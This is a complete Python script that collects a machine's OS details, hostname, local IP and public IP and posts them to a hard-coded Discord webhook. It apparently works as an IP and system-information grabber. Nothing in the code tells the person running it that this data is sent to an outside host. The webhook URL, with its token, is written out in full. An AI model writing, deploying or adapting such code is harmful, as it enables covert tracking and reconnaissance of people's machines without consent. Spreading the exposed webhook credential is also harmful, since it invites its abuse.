import platform
import requests
import socket

# Replace with your Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1320641725034926133/l1Y2_9bYYvtluQR4Io67E96ubDUT_x9wGDOHHtYz0GifdZOfGNq0Su2AqPji3ttuIWj8"

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json")
        response.raise_for_status()
        return response.json().get("ip")
    except requests.RequestException as e:
        return f"Error fetching IP: {e}"

def get_machine_info():
    try:
        return {
            "OS": platform.system(),
            "OS Version": platform.version(),
            "Machine Name": platform.node(),
            "Processor": platform.processor(),
            "Architecture": platform.architecture()[0],
            "Hostname": socket.gethostname(),
            "IP Address": socket.gethostbyname(socket.gethostname()),
        }
    except Exception as e:
        return {"Error": f"Failed to retrieve machine info: {e}"}

def send_to_discord(machine_info, public_ip):
    try:
        content = f"**Machine Info:**\n"
        for key, value in machine_info.items():
            content += f"{key}: {value}\n"
        content += f"**Public IP:** {public_ip}"
        payload = {"content": content}
        response = requests.post(WEBHOOK_URL, json=payload)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Failed to send to Discord: {e}")

if __name__ == "__main__":
    public_ip = get_public_ip()
    machine_info = get_machine_info()
    send_to_discord(machine_info, public_ip)
